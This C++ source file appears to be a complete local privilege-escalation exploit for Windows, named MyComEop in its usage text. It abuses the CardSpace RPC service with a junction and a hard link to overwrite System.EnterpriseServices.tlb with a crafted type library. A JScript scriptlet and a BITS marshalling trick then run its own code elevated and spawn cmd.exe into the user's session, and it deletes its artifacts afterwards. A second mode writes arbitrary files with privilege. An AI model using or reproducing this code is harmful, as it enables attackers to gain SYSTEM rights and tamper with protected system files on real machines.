
#define RPC_USE_NATIVE_WCHAR

#include "stdafx.h"
#include <bits.h>
#include <comdef.h>

#include "../MyComDefine/resolver_h.h"
#include "../CommonUtils/CommonUtils.h"
#include "../CommonUtils/ReparsePoint.h"
#include "../CommonUtils/FileSymlink.h"





#define LEN 1024
extern "C"  handle_t hBinding = NULL;
static IID IID_InterfaceTemp;
static IID TypeLib_InterfaceTemp;
static  wchar_t g_cmdline[LEN];
static  wchar_t g_dllPathBak[LEN];
static  wchar_t g_dllPath[LEN];
static BSTR CleanUpFileList[6] = { L"System.EnterpriseServices.tlb", L"System.EnterpriseServices.tlb.bak", L"run.sct", L"CardSpace.db", L"CardSpace.db.atomic", L"CardSpaceSP2.db"
};

class SafeScopedHandle
{
	HANDLE _h;
public:
	SafeScopedHandle() : _h(nullptr)
	{
	}

	SafeScopedHandle(SafeScopedHandle& h)
	{
		_h = h._h;
		h._h = nullptr;
	}

	SafeScopedHandle(SafeScopedHandle&& h) {
		_h = h._h;
		h._h = nullptr;
	}

	~SafeScopedHandle()
	{
		if (!invalid())
		{
			CloseHandle(_h);
			_h = nullptr;
		}
	}

	bool invalid() {
		return (_h == nullptr) || (_h == INVALID_HANDLE_VALUE);
	}

	void set(HANDLE h)
	{
		_h = h;
	}

	HANDLE get()
	{
		return _h;
	}

	HANDLE* ptr()
	{
		return &_h;
	}


};




struct THREAD_PARM
{
	HANDLE Reader;
	HANDLE Writer;
};



DWORD WINAPI ThreadProc(LPVOID lpParam){
	BYTE b[1030];
	DWORD d = 0;
	THREAD_PARM *tp = (THREAD_PARM*)lpParam;
	while (ReadFile(tp->Reader, b, 1024, &d, 0))
	{
		WriteFile(tp->Writer, b, d, &d, 0);
	}
	return 0;
}


static bstr_t IIDToBSTR(REFIID riid)
{
	LPOLESTR str;
	bstr_t ret = "Unknown";
	if (SUCCEEDED(StringFromIID(riid, &str)))
	{
		ret = str;
		CoTaskMemFree(str);
	}
	return ret;


}








_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob, __uuidof(IBackgroundCopyJob));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyManager, __uuidof(IBackgroundCopyManager));



bstr_t GetSystemDrive()
{
	WCHAR windows_dir[MAX_PATH] = { 0 };

	GetWindowsDirectory(windows_dir, MAX_PATH);

	windows_dir[2] = 0;

	return windows_dir;
}

bstr_t GetDeviceFromPath(LPCWSTR lpPath)
{
	WCHAR drive[3] = { 0 };
	drive[0] = lpPath[0];
	drive[1] = lpPath[1];
	drive[2] = 0;

	WCHAR device_name[MAX_PATH] = { 0 };

	if (QueryDosDevice(drive, device_name, MAX_PATH))
	{
		return device_name;
	}
	else
	{
		fflush(stdout);
		printf("[+][x] Error getting device for %ls\n", lpPath);
		exit(1);
	}
}

bstr_t GetSystemDevice()
{
	return GetDeviceFromPath(GetSystemDrive());
}

bstr_t GetExe()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	return curr_path;
}

bstr_t GetExeDir()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	PathRemoveFileSpec(curr_path);

	return curr_path;
}

bstr_t GetCurrentPath()
{
	bstr_t curr_path = GetExeDir();

	bstr_t ret = GetDeviceFromPath(curr_path);

	ret += &curr_path.GetBSTR()[2];

	return ret;
}


static HRESULT Check(HRESULT hr)
{
	if (FAILED(hr))
	{
		throw _com_error(hr);
	}
	return hr;
}





// {D487789C-32A3-4E22-B46A-C4C4C1C2D3E0}
static const GUID IID_BaseInterface =
{ 0xd487789c, 0x32a3, 0x4e22, { 0xb4, 0x6a, 0xc4, 0xc4, 0xc1, 0xc2, 0xd3, 0xe0 } };

// {6C6C9F33-AE88-4EC2-BE2D-449A0FFF8C02}
static const GUID TypeLib_BaseInterface =
{ 0x6c6c9f33, 0xae88, 0x4ec2, { 0xbe, 0x2d, 0x44, 0x9a, 0xf, 0xff, 0x8c, 0x2 } };

GUID TypeLib_Tapi3 = { 0x21d6d480, 0xa88b, 0x11d0, { 0x83, 0xdd, 0x00, 0xaa, 0x00, 0x3c, 0xca, 0xbd } };

void Create(bstr_t filename, bstr_t if_name, REFGUID typelib_guid, REFGUID iid, ITypeLib* ref_typelib, REFGUID ref_iid)
{
	DeleteFile(filename);
	ICreateTypeLib2Ptr tlb;
	Check(CreateTypeLib2(SYS_WIN32, filename, &tlb));
	//Check(CreateTypeLib2(SYS_WIN64, filename, &tlb));
	tlb->SetGuid(typelib_guid);

	ITypeInfoPtr ref_type_info;
	Check(ref_typelib->GetTypeInfoOfGuid(ref_iid, &ref_type_info));

	ICreateTypeInfoPtr create_info;
	Check(tlb->CreateTypeInfo(if_name, TKIND_INTERFACE, &create_info));
	Check(create_info->SetTypeFlags(TYPEFLAG_FDUAL | TYPEFLAG_FOLEAUTOMATION));
	HREFTYPE ref_type;
	Check(create_info->AddRefTypeInfo(ref_type_info, &ref_type));
	Check(create_info->AddImplType(0, ref_type));
	Check(create_info->SetGuid(iid));
	Check(tlb->SaveAllChanges());
}

std::vector<BYTE> ReadFile(bstr_t path)
{
	SafeScopedHandle hFile;
	hFile.set(CreateFile(path, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr));
	if (hFile.invalid())
	{
		throw _com_error(E_FAIL);
	}
	DWORD size = GetFileSize(hFile.get(), nullptr);
	std::vector<BYTE> ret(size);
	if (size > 0)
	{
		DWORD bytes_read;
		if (!ReadFile(hFile.get(), ret.data(), size, &bytes_read, nullptr) || bytes_read != size)
		{
			throw _com_error(E_FAIL);
		}
	}

	return ret;
}

void WriteFile(bstr_t path, const std::vector<BYTE> data)
{
	SafeScopedHandle hFile;
	hFile.set(CreateFile(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr));
	if (hFile.invalid())
	{
		throw _com_error(E_FAIL);
	}

	if (data.size() > 0)
	{
		DWORD bytes_written;
		if (!WriteFile(hFile.get(), data.data(), data.size(), &bytes_written, nullptr) || bytes_written != data.size())
		{
			throw _com_error(E_FAIL);
		}
	}
}

void WriteFile(bstr_t path, const char* data)
{
	const BYTE* bytes = reinterpret_cast<const BYTE*>(data);
	std::vector<BYTE> data_buf(bytes, bytes + strlen(data));
	WriteFile(path, data_buf);
}

void BuildTypeLibs(LPCSTR script_path, bstr_t if_name, bstr_t target_tlb)
{






	try{

		ITypeLibPtr stdole2;
		Check(LoadTypeLib(L"stdole2.tlb", &stdole2));

		fflush(stdout);

		unsigned int len = strlen(script_path);

		bstr_t buf = GetExeDir() + L"\\";
		for (unsigned int i = 0; i < len; ++i)
		{
			buf += L"A";
		}

		Create(buf, "IBadger", TypeLib_BaseInterface, IID_BaseInterface, stdole2, IID_IDispatch);
		ITypeLib* abc;
		Check(LoadTypeLib(buf, &abc));


		bstr_t built_tlb = GetExeDir() + L"\\output.tlb";
		Create(built_tlb, if_name, TypeLib_InterfaceTemp, IID_InterfaceTemp, abc, IID_BaseInterface);

		std::vector<BYTE> tlb_data = ReadFile(built_tlb);
		for (size_t i = 0; i < tlb_data.size() - len; ++i)
		{
			bool found = true;
			for (unsigned int j = 0; j < len; j++)
			{
				if (tlb_data[i + j] != 'A')
				{
					found = false;
				}
			}

			if (found)
			{
				fflush(stdout);
				printf("[+]Typelib:%s,%ls,%ls \n", script_path, if_name.GetBSTR(), IIDToBSTR(TypeLib_InterfaceTemp).GetBSTR());


				memcpy(&tlb_data[i], script_path, len);
				break;
			}
		}


		WriteFile(target_tlb, tlb_data);
		abc->Release();
		DeleteFile(buf);
		DeleteFile(built_tlb);
	}
	catch (const _com_error& err)
	{
		printf("[+]Error BuildT ypeLibs: %ls\n", err.ErrorMessage());
	}
}

const wchar_t x[] = L"ABC";

const wchar_t scriptlet_start[] = L"<?xml version='1.0'?>\r\n<package>\r\n<component id='giffile'>\r\n"
L"<registration description='Dummy' progid='giffile' version='1.00' remotable='True'>\r\n"\
L"</registration>\r\n"\
L"<script language='JScript'>\r\n"\
L"<![CDATA[\r\n"\
L"  new ActiveXObject('Wscript.Shell').exec('";

const wchar_t scriptlet_end[] = L"');\r\n"\
L"]]>\r\n"\
L"</script>\r\n"\
L"</component>\r\n"\
L"</package>\r\n";

bstr_t CreateScriptletFile()
{
	bstr_t script_file = GetExeDir() + L"\\run.sct";
	bstr_t script_data = scriptlet_start;
	bstr_t exe_file = GetExe();
	wchar_t* p = exe_file;
	while (*p)
	{
		if (*p == '\\')
		{
			*p = '/';
		}
		p++;
	}

	DWORD session_id;
	ProcessIdToSessionId(GetCurrentProcessId(), &session_id);
	WCHAR session_str[16];
	StringCchPrintf(session_str, _countof(session_str), L"%d", session_id);

	script_data += L"\"" + exe_file + L"\" " + session_str + scriptlet_end;

	WriteFile(script_file, script_data);

	return script_file;
}




class CMarshaller : public IMarshal
{
	LONG _ref_count;
	IUnknown * _unk;

	~CMarshaller() {}

public:

	CMarshaller(IUnknown * unk) : _ref_count(1)
	{
		_unk = unk;

	}


	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
		/* [in] */ REFIID riid,
		/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR *__RPC_FAR *ppvObject)
	{

		*ppvObject = nullptr;
		//printf("[+]QI [CMarshaller] - Marshaller: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);

		if (riid == IID_IUnknown)
		{
			*ppvObject = this;
		}
		else if (riid == IID_IMarshal)
		{
			*ppvObject = static_cast<IMarshal*>(this);
		}
		else
		{
			return E_NOINTERFACE;
		}
		//printf("[+]Queried Success: %p\n", *ppvObject);
		((IUnknown *)*ppvObject)->AddRef();
		return S_OK;
	}

	virtual ULONG STDMETHODCALLTYPE AddRef(void)
	{

		//printf("[+]AddRef: %d\n", _ref_count);
		return InterlockedIncrement(&_ref_count);
	}

	virtual ULONG STDMETHODCALLTYPE Release(void)
	{

		//printf("[+]Release: %d\n", _ref_count);
		ULONG ret = InterlockedDecrement(&_ref_count);
		if (ret == 0)
		{
			printf("[+]Release object %p\n", this);
			delete this;
		}
		return ret;
	}



	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  CLSID *pCid)
	{
		GUID CLSID_AggStdMarshal2 = { 0x00000027, 0x0000, 0x0008, { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
		*pCid = CLSID_AggStdMarshal2;

		//printf("[+]GetUnmarshalClass: %ls %p\n", IIDToBSTR((REFIID)*pCid).GetBSTR(), this);
		return S_OK;
	}
	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags)
	{
		IStorage* stg;
		ILockBytes* lb;
		CreateILockBytesOnHGlobal(nullptr, TRUE, &lb);
		StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);		
		ULONG cbRead;
		ULONG cbWrite;
		IStreamPtr pStream = nullptr;
		HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &pStream);
		LARGE_INTEGER dlibMove = { 0 };
		ULARGE_INTEGER plibNewPosition;		
		hr = CoMarshalInterface(pStream, IID_IUnknown, static_cast<IUnknownPtr>(stg), dwDestContext, pvDestContext, mshlflags);
		OBJREF* headerObjRef = (OBJREF*)malloc(1000);
		hr = pStream->Seek(dlibMove, STREAM_SEEK_SET, &plibNewPosition);
		hr = pStream->Read(headerObjRef, 1000, &cbRead);
		printf("[+]MarshalInterface: %ls %p\n", IIDToBSTR(IID_InterfaceTemp).GetBSTR(), this);		
		headerObjRef->iid = IID_InterfaceTemp;
		hr = pStm->Write(headerObjRef, cbRead, &cbWrite);
		return hr;

	}


	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  DWORD *pSize)
	{
		*pSize = 1024;
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][out] */
		_Outptr_  void **ppv)
	{
		return E_NOTIMPL;
	}

	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
		/* [annotation][unique][in] */
		_In_  IStream *pStm)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
		/* [annotation][in] */
		_In_  DWORD dwReserved)
	{
		return S_OK;
	}
};







class FakeObject : public IBackgroundCopyCallback2, public IPersist
{
	HANDLE m_ptoken;
	LONG m_lRefCount;
	IUnknown *_umk;
	~FakeObject() {};

public:
	//Constructor, Destructor
	FakeObject(IUnknown *umk) {
		_umk = umk;
		m_lRefCount = 1;

	}

	//IUnknown
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
	{


		//printf("[+]QI [FakeObject] - Marshaller: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
		if (riid == __uuidof(IUnknown))
		{
			printf("[+]Query for IUnknown\n");
			*ppvObj = this;
		}
		else if (riid == __uuidof(IBackgroundCopyCallback2))
		{
			printf("[+]Query for IBackgroundCopyCallback2\n");

		}
		else if (riid == __uuidof(IBackgroundCopyCallback))
		{
			printf("[+]Query for IBackgroundCopyCallback\n");

		}
		else if (riid == __uuidof(IPersist))
		{
			printf("[+]Query for IPersist\n");
			*ppvObj = static_cast<IPersist*>(this);
			//*ppvObj = _unk2;
		}

		else if (riid == IID_IMarshal)
		{
			printf("[+]Query for IID_IMarshal\n");
			//*ppvObj = static_cast<IBackgroundCopyCallback2*>(this);


			*ppvObj = NULL;
			return E_NOINTERFACE;
		}
		else
		{
			printf("[+]Unknown IID: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		((IUnknown *)*ppvObj)->AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

		if (0 == ulCount)
		{
			delete this;
		}

		return ulCount;
	}

	virtual HRESULT STDMETHODCALLTYPE JobTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob)
	{
		printf("[+]JobTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE JobError(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyError *pError)
	{
		printf("[+]JobError\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE JobModification(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ DWORD dwReserved)
	{
		printf("[+]JobModification\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE FileTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyFile *pFile)
	{
		printf("[+]FileTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetClassID(
		/* [out] */ __RPC__out CLSID *pClassID)
	{
		printf("[+]GetClassID\n");


		*pClassID = GUID_NULL;

		return S_OK;
	}
};



_COM_SMARTPTR_TYPEDEF(IEnumBackgroundCopyJobs, __uuidof(IEnumBackgroundCopyJobs));

void TestBits(HANDLE hEvent)
{
	
		IBackgroundCopyManagerPtr pQueueMgr;
		IID CLSID_BackgroundCopyManager;
		IID IID_IBackgroundCopyManager;
		CLSIDFromString(L"{4991d34b-80a1-4291-83b6-3328366b9097}", &CLSID_BackgroundCopyManager);
		CLSIDFromString(L"{5ce34c0d-0dc9-4c1f-897c-daa1b78cee7c}", &IID_IBackgroundCopyManager);

		HRESULT	hr = CoCreateInstance(CLSID_BackgroundCopyManager, NULL,
			CLSCTX_ALL, IID_IBackgroundCopyManager, (void**)&pQueueMgr);

		IUnknown * pOuter = new CMarshaller(static_cast<IPersist*>(new FakeObject(nullptr)));
		IUnknown * pInner;

		CoGetStdMarshalEx(pOuter, CLSCTX_INPROC_SERVER, &pInner);

		IBackgroundCopyJobPtr pJob;
		GUID guidJob;

		IEnumBackgroundCopyJobsPtr enumjobs;
		hr = pQueueMgr->EnumJobs(0, &enumjobs);
		if (SUCCEEDED(hr))
		{
			IBackgroundCopyJob* currjob;
			ULONG fetched = 0;

			while ((enumjobs->Next(1, &currjob, &fetched) == S_OK) && (fetched == 1))
			{
				LPWSTR lpStr;
				if (SUCCEEDED(currjob->GetDisplayName(&lpStr)))
				{
					if (wcscmp(lpStr, L"BitsAuthSample") == 0)
					{
						CoTaskMemFree(lpStr);
						currjob->Cancel();
						currjob->Release();
						break;
					}
				}
				currjob->Release();
			}
		}


		pQueueMgr->CreateJob(L"BitsAuthSample",
			BG_JOB_TYPE_DOWNLOAD,
			&guidJob,
			&pJob);



		IUnknownPtr pNotify;


		pNotify.Attach(new CMarshaller(pInner));
		{


			HRESULT hr = pJob->SetNotifyInterface(pNotify);
			printf("[+]Test Background Intelligent Transfer Service Result: %08X\n", hr);

		}
		if (pJob)
		{
			pJob->Cancel();
		}

		//printf("[+]Done\n");
		SetEvent(hEvent);
		
}

BOOL  DirectoryListCleanUp(BSTR Path, BSTR ExeName)
{
	if (!PathIsDirectoryW(Path))
	{

		return FALSE;
	}
	WIN32_FIND_DATAW FindData;
	HANDLE hError;

	BSTR FilePathName = (BSTR)malloc(LEN);
	// 构造路径
	bstr_t FullPathName;
	wcscpy(FilePathName, Path);
	wcscat(FilePathName, L"\\*.*");
	hError = FindFirstFile(FilePathName, &FindData);
	if (hError == INVALID_HANDLE_VALUE)
	{
		//printf("[+]Enumerating %ls Failed Try To Skip, code: %d,error: %d\n", FilePathName, GetLastError(), hError);
		return 0;
	}
	while (::FindNextFile(hError, &FindData))
	{
		// 过虑.和..
		if (_wcsicmp(FindData.cFileName, L".") == 0
			|| _wcsicmp(FindData.cFileName, L"..") == 0)
		{
			continue;
		}
		FullPathName = bstr_t(Path) + "\\" + FindData.cFileName;
		// 构造完整路径
		if (_wcsicmp(ExeName, FindData.cFileName) != 0)
		{
			//printf("%ls\n", FullPathName.GetBSTR());
			for (int i = 0; i < 6;i++)
			{

				if (_wcsicmp(CleanUpFileList[i], FindData.cFileName) == 0)
				{
					DeleteFile(FullPathName);
				}
			}
			
		}
		//wsprintf(FullPathName, L"%s\\%s", Path, FindData.cFileName);
		//FileCount++;
		// 输出本级的文件

		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			DirectoryListCleanUp(FullPathName, ExeName);
		}
	}
	return FALSE;
}





extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(HeapAlloc(GetProcessHeap(), 0, len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	HeapFree(GetProcessHeap(), 0, ptr);
}

BOOL StartConnectingService()
{
	WCHAR* svcName = L"idsvc";
	SC_HANDLE schSCM;
	SC_HANDLE schSvc;
	SERVICE_STATUS ServiceStatus;
	schSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (NULL == schSCM)
	{
		printf("Failed OpenSCManager: %d\n", GetLastError());
		return FALSE;
	}

	schSvc = OpenService(schSCM, svcName, SERVICE_START | SERVICE_QUERY_STATUS);
	if (NULL == schSvc)
	{
		wprintf(L"Failed OpenService %s: %d\n", svcName, GetLastError());
		return FALSE;
	}
	QueryServiceStatus(schSvc, &ServiceStatus);
	if (ServiceStatus.dwCurrentState == SERVICE_RUNNING || ServiceStatus.dwCurrentState == SERVICE_PAUSED)

	{
		wprintf(L"ServiceStatus Already Started %s: %d\n", svcName, GetLastError());
		CloseServiceHandle(schSvc);
		CloseServiceHandle(schSCM);
		return TRUE;

	}
	if (!StartService(schSvc, 0, NULL))
	{
		wprintf(L"Failed Starting %s: %d\n", svcName, GetLastError());
		return FALSE;
	}

	CloseServiceHandle(schSvc);
	CloseServiceHandle(schSCM);
	Sleep(1000);
	wprintf(L"ServiceStatus New started %ls: %d\n", svcName, GetLastError());
	return TRUE;
}

BOOL StartRpcService()
{
	RPC_STATUS status;
	unsigned int  cMinCalls = 1;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	if (StartConnectingService())
	{

		status = RpcStringBindingComposeW(nullptr, L"ncalrpc", 0, L"31336F38236F3E2C6F3F2E6F20336F20236F21326F", nullptr, &StringBinding);

		if (status){
			printf("RpcStringBindingComposeW Failed:%d\n", status);
			return(status);
		}

		status = RpcBindingFromStringBindingW(StringBinding, &hBinding);
		RpcStringFreeW(&StringBinding);
		if (status){
			printf("RpcBindingFromStringBindingW Failed:%d\n", status);
			return(status);
		}
		SecurityQOS.Version = 1;
		SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
		SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
		SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

		status = RpcBindingSetAuthInfoExW(hBinding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
		if (status){
			printf("RpcBindingSetAuthInfoExW Failed:%d\n", status);
			return(status);
		}

		status = RpcEpResolveBinding(hBinding, DefaultIfName_v1_0_c_ifspec);

		if (status){
			printf("RpcEpResolveBinding Failed:%d\n", status);
			return(status);
		}

	}
	else
	{
		printf("Start Connecting Windows Cardspace Service Failed");
		return 0;
	}
	return 0;
}

BOOL RunRpcService()
{
	RpcRequest* req = (RpcRequest*)CoTaskMemAlloc(sizeof(RpcRequest));
	req->Type = L"ManageRequest";
	req->Length = 0;
	req->Data = 0;
	RpcResponse* rep = (RpcResponse*)CoTaskMemAlloc(sizeof(RpcResponse));
	UINT32* ctx = 0;
	long ret = Proc0_RPCClientBindToService(hBinding, (void**)&ctx);
	printf("Proc0_RPCClientBindToService :%d\n", ret);
	ret = Proc2_RPCDispatchClientUIRequest((void**)&ctx, req, &rep);
	printf("Proc2_RPCDispatchClientUIRequest :%08x\n", ret);
	return 0;
}


void CreateNewProcess(const wchar_t* session)
{

	try
	{
		ShellExecuteW(NULL, NULL, L"C:\\Windows\\System32\\bitsadmin.exe", L"/reset /allusers", NULL, SW_HIDE);
	}
	catch (const _com_error& err)
	{
	}

	bstr_t exeDir = GetExeDir();
	bstr_t dllPathBak = exeDir + L"\\" + PathFindFileName(g_dllPath) + ".bak";

	wcscpy(g_dllPathBak, dllPathBak.GetBSTR());

	bstr_t exeName = PathFindFileName(GetExe());


	//printf("[+][Info] Restoring BackUp dll Done \n");
	CopyFileW(g_dllPathBak, g_dllPath, false);


	DirectoryListCleanUp(exeDir, exeName);

	
	DWORD session_id = wcstoul(session, nullptr, 0);
	SafeScopedHandle token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token.ptr()))
	{
		throw _com_error(E_FAIL);
	}

	SafeScopedHandle new_token;

	if (!DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, new_token.ptr()))
	{
		throw _com_error(E_FAIL);
	}

	SetTokenInformation(new_token.get(), TokenSessionId, &session_id, sizeof(session_id));

	STARTUPINFO start_info = {};
	start_info.cb = sizeof(start_info);
	start_info.lpDesktop = L"WinSta0\\Default";
	PROCESS_INFORMATION proc_info;
	WCHAR cmdline[] = L"cmd.exe";
	if (CreateProcessAsUser(new_token.get(), nullptr, cmdline,
		nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info))
	{
		CloseHandle(proc_info.hProcess);
		CloseHandle(proc_info.hThread);
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	try
	{


		printf("[+] For Run CMD Directly: MyComEop.exe \n");
		printf("[+] For Test File Write : MyComEop.exe \"SourceFile\" \"DestinationFile\" \n");
		//system("pause");
		BSTR dllPath = L"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\System.EnterpriseServices.tlb";
		BSTR if_name = (BSTR)malloc(LEN);
		BSTR user_name = (BSTR)malloc(LEN);
		DWORD usernamelen = 100;
		bstr_t exdir = GetExeDir();
		//当前目录下的临时typelib
		bstr_t target_tlb = exdir + L"\\CardSpace.db";
		bstr_t UpdateTaskFile = exdir + L"\\CardSpace.db.atomic";
		BSTR CardSpaceOld = (BSTR)malloc(LEN);
		GetUserNameW(user_name, &usernamelen);
		StringCbPrintfW(CardSpaceOld, LEN, L"C:\\Users\\%ls\\AppData\\Local\\Microsoft\\CardSpace", user_name);
		FileSymlink sl(false);
		HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
		HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		hr = CoInitializeSecurity(
			NULL,
			-1,
			NULL,
			NULL,
			RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
			RPC_C_IMP_LEVEL_IMPERSONATE,
			NULL,
			EOAC_DYNAMIC_CLOAKING,
			0
			);

		if (argc < 2)
		{


			StartRpcService();
			wcscpy(if_name, L" IRegistrationHelper");




			CLSIDFromString(L"{55E3EA25-55CB-4650-8887-18E8D30BB4BC}", &IID_InterfaceTemp);
			CLSIDFromString(L"{4FB2D46F-EFC8-4643-BCD0-6E5BFA6A174C}", &TypeLib_InterfaceTemp);



			bstr_t script = L"script:" + CreateScriptletFile();

			BuildTypeLibs(script, if_name, target_tlb);


			if (CreateDirectory(CardSpaceOld, nullptr) || (GetLastError() == ERROR_ALREADY_EXISTS))
			{
				if (!ReparsePoint::CreateMountPoint(CardSpaceOld, exdir.GetBSTR(), L""))
				{
					printf("Error creating mount point - %d\n", GetLastError());
					return 0;
				}
			}
			else
			{
				printf("Error creating directory - %d\n", GetLastError());
				return 0;
			}


			if (CreateNativeHardlink(UpdateTaskFile.GetBSTR(), dllPath) == false)
			{
				printf("[+]CreateNativeHardlink Failed,error: %d\n", GetLastError());
				return FALSE;
			}


			bstr_t dllPathBak = GetExeDir() + L"\\" + PathFindFileName(dllPath) + ".bak";

			wcscpy(g_dllPathBak, dllPathBak.GetBSTR());
			wcscpy(g_dllPath, dllPath);

			CopyFileW(dllPath, g_dllPathBak, false);

			wcscpy(g_cmdline, L"whoami");

			RunRpcService();
			if (!RemoveDirectory(CardSpaceOld))
			{
				printf("Error deleting mount point %ls\n", GetErrorMessage().c_str());
				return 1;
			}

			TestBits(hEvent);
		}
		else if (argc == 3)
		{
			StartRpcService();
			CopyFileW(argv[1], target_tlb.GetBSTR(), false);
			if (CreateDirectory(CardSpaceOld, nullptr) || (GetLastError() == ERROR_ALREADY_EXISTS))
			{
				if (!ReparsePoint::CreateMountPoint(CardSpaceOld, exdir.GetBSTR(), L""))
				{
					printf("Error creating mount point - %d\n", GetLastError());
					return 0;
				}
			}
			else
			{
				printf("Error creating directory - %d\n", GetLastError());
				return 0;
			}


			if (CreateNativeHardlink(UpdateTaskFile.GetBSTR(), argv[2]) == false)
			{
				printf("[+]CreateNativeHardlink Failed,error: %d\n", GetLastError());
				return FALSE;
			}

			RunRpcService();
			if (!RemoveDirectory(CardSpaceOld))
			{
				printf("Error deleting mount point %ls\n", GetErrorMessage().c_str());
				return 1;
			}
			printf("[+]RunRpcService Done Check if the Destination File is be written,code: %d\n", GetLastError());
		}
		else
		{
			wcscpy(g_dllPath, dllPath);
			CreateNewProcess(argv[1]);
		}

	}
	catch (const _com_error& err)
	{
		printf("Error: %ls\n", err.ErrorMessage());
	}
	CoUninitialize();//释放COM
	return 0;
}
